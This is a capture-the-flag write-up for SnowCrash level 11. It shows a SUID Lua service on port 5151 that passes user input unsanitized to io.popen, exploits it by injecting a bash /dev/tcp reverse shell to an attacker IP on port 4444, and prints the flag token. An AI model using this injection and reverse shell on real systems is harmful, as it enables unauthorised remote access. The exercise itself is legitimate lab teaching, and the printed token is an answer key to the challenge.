- In directory `/home/user/level11` the script `level11.lua` has the SUID set to execute as `flag11`.
```
level11@SnowCrash:~$ pwd
/home/user/level11
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

- Examining the script reveals that a user can connect to localhost on port 5151 and is prompted with 'Password: '. Upon entering the password the password is passed into a hash function. However, the user input is not sanitized at all

```
<snip>
local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
<snip>
```

- In the hash function the user input is used in the io.popen() function unsanitized to make a system call. The opportunity to carry out command injection exists.

``` 
<snip>
prog = io.popen("echo "..pass.." | sha1sum", "r")
<snip>
```

- A reverse shell payload is created to connect back to the attack machine on port 4444.
`/bin/bash -c '/bin/sh -i >& /dev/tcp/<attackIp>/4444 0>&1'`

- A netcat listener is started on the attack machine on port 4444
```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ nc -lnvp 4444                                            
listening on [any] 4444 ...
```

- Then on the target host (snowcrash) we connect to localhost 5151 and when prompted with the password we carry out command injection by breaking out of the `echo` command with the `;` terminator, and injecting our reverse shell script

```
level11@SnowCrash:~$ nc localhost 5151
Password: passw; /bin/bash -c '/bin/sh -i >& /dev/tcp/10.13.200.129/4444 0>&1'
```

- On the attack machine, a reverse shell is obtained as `flag11` and the flag token is retrieved
```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ nc -lnvp 4444                                            
listening on [any] 4444 ...
connect to [10.13.200.129] from (UNKNOWN) [10.13.200.131] 52966
/bin/sh: 0: can't access tty; job control turned off
$ whoami
flag11
$ getflag
Check flag.Here is your token : fa6v5ateaw21peobuub8ip
```

- Using the token authenticate as `level12` on the target host
```
level11@SnowCrash:~$ su level12
Password: 
level12@SnowCrash:~$ 

```